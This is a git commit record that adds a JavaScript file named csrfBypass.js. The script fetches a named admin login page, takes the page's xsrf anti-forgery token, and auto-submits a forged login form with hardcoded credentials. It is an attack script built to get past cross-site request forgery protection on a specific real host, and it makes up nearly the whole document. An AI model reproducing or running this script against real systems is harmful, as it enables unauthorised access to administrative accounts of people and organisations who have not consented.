be71ff13d3322be00fb9e894d9aebaf67b00c964
User15231 <109126461+User15231@users.noreply.github.com>
2022-07-12 12:12:32 +0530

    Create csrfBypass.js

---
+++ csrfBypass.js
@@ -0,0 +1,25 @@
+var page = 'https://redhatdev.compunnel.com/platform/admin/login?next=%2Fplatform%2Fadmin';
+var html = get(page);
+document.body.innerHTML = html;
+var form = document.forms[0];
+var token = form.xsrf.value;
+form.xsrf.value = "";
+
+document.body.innerHTML +=
+	 '<form id="myform" action="' + page + '" method="POST">'
+	+'<input type="text" name="login" value="user">'
+	+'<input type="password" name="password" value="redhat">'
+	+'<input type="hidden" name="next" value="">'
+	+'<input type="hidden" name="xsrf" value="' + token + '">'
+	+'<input type="submit" name="submit">'
+	+'</form>';
+
+document.forms["myform"].submit();
+
+//alert(form.xsrf.value +" \n "+token);
+function get(url) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", url, false);
+    xmlHttp.send(null);
+    return xmlHttp.responseText;
+}
